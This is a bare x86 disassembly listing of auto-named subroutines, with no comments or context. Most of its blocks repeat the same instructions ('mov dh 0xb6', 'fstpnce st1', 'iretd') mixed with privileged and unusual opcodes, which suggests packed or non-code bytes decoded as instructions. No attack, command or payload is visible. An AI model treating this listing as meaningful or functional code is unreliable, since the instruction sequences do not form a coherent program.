mov dh 0xb6
mov dh 0xb6
mov dh 0x71
iretd
sub_47445c
push ebp
cmc
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x66
iretd
sub_47446d
0xd9d7
sub_47458d
0xbecf
sub_474590
and eax 0xad732626
0xcf77
sub_4745dd
mov edx 0xb6d9d9c6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0x7577
sub_474615
fstpnce st1
fnstenv [ esi - 0x4a3099b4 ]
and [ esi ] esp
mov dh 0x73
lodsd [ esi ]
0xcaa5
sub_47465e
retn 0xd9d0
sub_4746a6
push es
iretd
sub_4746bd
sub [ edx ] 0x26
mov dh 0xb6
mov dh 0x77
lodsd [ esi ]
arpl [ esi ] bp
scasd [ edi ]
arpl dx bx
lodsd [ esi ]
arpl dx bx
iretd
sub_474852
and ebp ebx
fstpnce st1
mov dh 0xb6
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9ca6f ] eax
fst [ ebx + 0x2a ]
lodsd [ esi ]
imul ebp [ esi ] 0xffffffcf
into
0xe615d9d9 0xb6e5
sub_474921
iretd
sub_474922
insd
and eax 0xb6b62626
mov dh 0xb6
mov dh 0xa7
0x240a
sub_47492f
dec esp
sbb al 0x7e
iretd
sub_474964
inc ecx
salc
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
pop ds
hlt
sub_474b50
push ss
iretd
sub_474b52
xor ebp esi
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
pop ds
jpo r-xdata
sub [ edx - 0x262637ba ] esp
iretd
sub_474b94
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec ebp
out 0x2c al
iretd
sub_474bec
fstpnce st1
mov dh 0x73
lodsd [ esi ]
0xcf71
sub_474c09
enter 0xd9d9 0x76
into
xor [ eax ] esi
iretd
sub_474e3c
pop esp
sub ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0x262632b7 ] eax
fst [ ebx + 0x2a ]
iretd
sub_474e66
mov bh cl
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fnstenv [ ecx + 0x262626ce ]
iretd
sub_474e9c
mov dl ah
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9f779 ] al
iretd
sub_474ed9
mov al 0xcd
fstpnce st1
mov dh 0xb6
lodsd [ esi ]
fmulp st6
adc bh ch
fstpnce st1
iretd
sub_474ef0
inc edi
0xd9d9
sub_474ef4
mov dh 0xb6
mov dh 0xb6
mov dh 0x4c
dec edi
iretd
sub_474efc
xchg [ edx ] bh
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
movsd [ edi ] [ esi ]
out 0x24 eax
iretd
sub_474f0e
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
push esi
sbb ah [ 0x7618a7d6 ]
arpl [ esi ] sp
iretd
sub_474f22
imul esi edi 0xb6b6d9d9
mov dh 0xb6
fst [ ebx + 0x36 ]
fnstenv [ ecx + 0x262626d2 ]
jns r-xdata
out 0x29 al
mov [ 0xffffffffd9d9ef42 ] eax
iretd
iretd
sub_474f8f
mov edx 0xb626262b
mov dh 0xaf
scasb [ edi ]
xchg esi eax
fst [ es : ebx - 0x3a ]
iretd
sub_474f9f
fbld [ edx ]
mov dh 0xb6
mov dh 0xb6
into
xor ebp 0xe6a3d9d9
sub [ ebx - 0x262610be ] esp
iretd
sub_4750a0
daa
sub esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
ror bh 0x1
pushad
iretd
sub_4750b6
fstpnce st1
iretd
sub_4750d2
retn
sub_4750d3
and eax 0xb6b62626
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ecx + 0x262626e2 ]
iretd
sub_475111
xor al 0xf6
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9dd72 ] eax
iretd
sub_475200
das
iretd
sub_475202
0xb6d9d9f8 0x66b6
iretd
sub_47520a
mov ah 0xcf
fstpnce st1
mov dh 0x4c
push ss
jg r-xdata
mov al [ 0x54cef725 ]
retn 0xd9d9
lodsd [ esi ]
daa
iretd
sub_475216
pop es
fcompp
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
iretd
sub_475243
fstpnce st1
iretd
sub_475248
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
xor ah [ eax + 0x54cef725 ]
retn 0xd9d9
sub_47539c
fstpnce st1
mov dh 0xb6
mov dh 0x4c
fst [ es : edx + 0x2 ]
xor bl cl
adc cl bl
mov cl 0xda
iretd
sub_4753db
loop r-xdata
mov dh 0xb6
mov dh 0xef
in eax 0xb6
mov dh 0xb6
mov dh 0x29
test al 0xe5
fnstenv [ esi - 0x22ad5c55 ]
fstpnce st1
iretd
sub_47541b
or ebp ebp
fstpnce st1
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
mov [ 0xffffffffd9d9dbfe ] eax
sbb eax 0xa2292e63
int3
sub_475543
push ebp
sub [ esi ] ah
mov dh 0x4c
fnstenv [ es : eax + 0x2626268a ]
dec esi
0xcf262626 0xc598
sub_4755fe
retn 0xd9d9
sub_475601
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jae r-xdata
inc eax
iretd
sub_475645
in eax 0xd3
fstpnce st1
sub [ ebx - 0x2626128e ] esp
or eax 0xe5def7e7
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9db86 ] eax
iretd
sub_475666
xor esp [ esi ]
mov dh 0xb6
mov dh 0x4e
and ah [ edi ]
iretd
sub_475672
outsb
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
salc
sbb eax 0x79a229d5
cmc
fstpnce st1
iretd
sub_4757a2
sbb eax 0x75262629
iretd
sub_4757a8
sahf
cmc
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xaf
arpl dx dx
sahf
iret
sub_47583e
mov edi 0xb6262635
mov dh 0xb6
fst [ ebx + 0x36 ]
fst [ ebx + 0x2a ]
fnstenv [ esi + 0x262626ba ]
iretd
sub_475852
mov eax [ 0xffffffffb6d9d9fc ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
movsd [ edi ] [ esi ]
pop ds
iretd
sub_475862
or eax 0xb6d9d9f2
mov dh 0xb6
sub [ edx - 0x26261922 ] esp
iretd
sub_475882
mov dh 0xb6
lodsd [ esi ]
bound eax [ edx ]
cmp bl [ 0xffffffffa4293e65 ]
mov esp 0xa3d9d9f0
fldcw [ ecx ]
mov [ 0xffffffffd9d9c1d7 ] al
iretd
sub_4758b3
retn
sub_475a2e
mov eax 0xb6d9d9ee
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9f836 ] al
iretd
sub_475b3c
adc edx eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
movsd [ edi ] [ esi ]
0xcf32
sub_475b50
pop ecx
retn
sub_475b52
fstpnce st1
sub [ ebx + 0x26262c45 ] esp
iretd
sub_475b5b
sub dl dl
fstpnce st1
mov dh 0xb6
mov dh 0xb6
iretd
sub_475bdf
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9d942 ] eax
iretd
sub_475bf2
out dx eax
fstp st1
fnstenv [ esi - 0x4949494a ]
out dx eax
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9d13d ] al
iretd
sub_475c0a
add [ ebx ] ah
sub [ es : ecx + 0x66cf2060 ] edx
cli
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
dec ecx
iretd
sub_475cfd
bound ebx [ ebx - 0x49492627 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
dec esp
iretd
sub_475d0c
retn
sub_475e08
push ebx
int3
sub_475e63
push 0xb6262636
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
iretd
sub_475e6f
cmp ah [ eax ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ ecx + 0x62ab3260 ] edx
push ss
iretd
sub_475e82
into
0xd9d9
sub_475eb2
mov dh 0xb6
mov [ 0xffffffff8ea229e6 ] eax
xlat
fstpnce st1
iretd
sub_475ed5
into
in ax dx
fstpnce st1
iretd
sub_476029
0xd9d9
sub_47602c
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fnstenv [ eax + 0x2626268a ]
iretd
sub_476050
daa
iretd
sub_476054
retn 0xd9cc
sub_476057
fnstenv [ esi - 0x48c3081 ]
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
mov [ 0xffffffffd9d9dba6 ] eax
into
retn 0x2624
sub_476074
arpl dx ax
jbe r-xdata
mov dh 0xb6
mov dh 0xcf
arpl [ esi + 0x4c757576 ] bp
and dh [ ebp + 0x75 ]
jne r-xdata
iretd
pop es
int3
sub_47610f
fstpnce st1
iretd
sub_476112
daa
mov dh 0x76
adc eax 0xcc47cfd0
fstpnce st1
iretd
sub_476120
push edi
and al 0x26
mov dh 0xb6
mov dh 0xab
bound esp [ edi - 0x28 ]
iretd
sub_47612c
loope r-xdata
fnstenv [ esi + 0x6daa29b6 ]
fstpnce st1
mov dh 0xb6
mov dh 0xb6
lodsb [ si ]
aaa
iretd
sub_4761cd
mov dh 0xb6
inc eax
movsd [ edi ] [ esi ]
sbb al 0x26
iretd
sub_47621d
push esi
pop edi
iretd
sub_476220
fcom [ eax - 0x49492627 ]
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcf77
sub_47632f
push edx
fcomp st1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
arpl si bx
iretd
sub_476343
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
sub_47634e
push es
rcr cl 0xd9
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
xchg ecx eax
aaa
inc eax
scasd [ edi ]
iretd
sub_47636e
fstpnce st1
mov dh 0xad
0x7577
sub_4763a4
push ecx
fcmovnu st1
fldcw [ ecx ]
mov [ 0xffffffffd9d9ec67 ] al
adc eax 0x3dcf67ef
iretd
sub_476460
iretd
sub_4764ac
fstp st1
iretd
sub_47650e
out dx eax

sub_476510
fstpnce st1
mov dh 0x29
mov [ 0xffffffffd9d9dc23 ] al
iretd
sub_47651a
push edi
fstp st1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xa3
out dx eax
iretd
sub_476529
mov dh 0xb6
mov dh 0xb6
mov dh 0x4e
push ss
iretd
sub_476538
push 0xb6d9d9e0
mov dh 0xad
jae r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcaa5
iretd
sub_476542
iretd
sub_476543
xlat
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
xor ch [ eax ]
iretd
sub_476579
sub ch [ ebx - 0x30892d9d ]
popfd
daa
lodsd [ es : esi ]
arpl si bx
iretd
sub_4765ea
aam 0xcc
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0x4e
pop edi
or ch ah
mov dl 0x71
iretd
sub_476769
popfd
int3
sub_4767a4
leave
fstpnce st1
inc eax
scasd [ edi ]
imul ebp esi 0xffffffad
out dx al
iretd
sub_4767af
mov eax [ 0xffffffffb6d9d9c9 ]
mov dh 0xb6
sub [ ebx - 0x26266418 ] esp
movsd [ edi ] [ esi ]
in al 0x24
iretd
sub_476812
adc ch 0xd9
fnstenv [ esi - 0x555dd64a ]
cmc
fstpnce st1
lodsd [ esi ]
imul ebp [ esi ] 0xd
out dx al
lodsb [ esi ]
fldcw [ ss : ebx + 0x2a ]
scasb [ edi ]
xor ah [ edi ]
iretd
sub_47682c
dec bh
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ ebx - 0x262610f4 ] esp
iretd
sub_476882
fstpnce st1
fst [ eax + 0x72 ]
iretd
sub_476986
out 0xc6 al
fstpnce st1
movsd [ edi ] [ esi ]
fisub [ edi ]
iretd
sub_47698e
xchg ebp eax
retn 0xd9d9
sub_4769bf
enter 0xd9c0 0xd9
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
fmul [ ebx ]
sub [ edx - 0x2626086f ] esp
iretd
sub_4769d3
out 0xd9 al
fnstenv [ esi - 0x2a9a3081 ]
fstpnce st1
mov dh 0xb6
iretd
sub_476a8c
lds edx [ ecx - 0x49492627 ]
mov dh 0xb6
mov dh 0xad
arpl [ esi ] bp
fnstenv [ esi + 0x42 ]
iretd
sub_476b34
push ds
in eax 0xd9
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
arpl dx bx
iretd
sub_476b6b
out dx eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
arpl si ax
iretd
sub_476b7b
mov ebx [ eax - 0x49492627 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ ecx - 0x105cbfd2 ] edx
iretd
sub_476c22
imul edx [ edi - 0x26892627 ] 0xd9757671
mov cl 0x8a
dec esp
inc edx
iretd
sub_476ca8
adc eax 0xce63e014
iretd
sub_476d1c
add eax 0xb6d9d9cf
mov dh 0xb6
mov dh 0xae
arpl si si
iretd
sub_476d28
cdq
rcr ecx cl
fnstenv [ esi - 0xe625dd7 ]
fstpnce st1
iretd
sub_476d34
in al dx

sub_476d36
fstpnce st1
fst [ eax + 0x72 ]
iretd
sub_476d3c
daa
cmc
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9e54a ] al
iretd
sub_476d52
mov ebp 0x73d9d9fe
lodsd [ esi ]
0xcf77
sub_476d87
fxch st6
adc ch bh
fstpnce st1
iretd
sub_476d8e
dec ecx
pushfd
fstpnce st1
mov dh 0x71
dec esp
daa
dec esi
cmpsb [ es : esi ] [ edi ]
fst [ ebx + 0x2e ]
iretd
sub_476d9f
out 0xe4 al
fstpnce st1
mov dh 0xb6
and eax 0xc97acfe6
fstpnce st1
fnstenv [ ecx + 0x2626268e ]
iretd
sub_476db3
retn
sub_476e2d
or edi 0xa229d9d9
mov dl al
fstpnce st1
iretd
sub_476eda
mov cl [ ebx - 0x49492627 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xe1
and [ es : esi ] esp
daa
iretd
sub_476eff
0xd9d9
sub_476f07
ffree st7
fstpnce st1
mov dh 0xb6
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
j_sub_403878#3
jmp sub_403878
sub_476f40
pop ebp
retn
j_sub_403878#2
jmp sub_403878
sub_4770f1
pop edi
pop esi
pop ebx
pop ebp
retn
sub_477146
retn
j_sub_403878
jmp sub_403878
j_sub_477146
jmp sub_477146
sub_47714e
pop ebp
retn
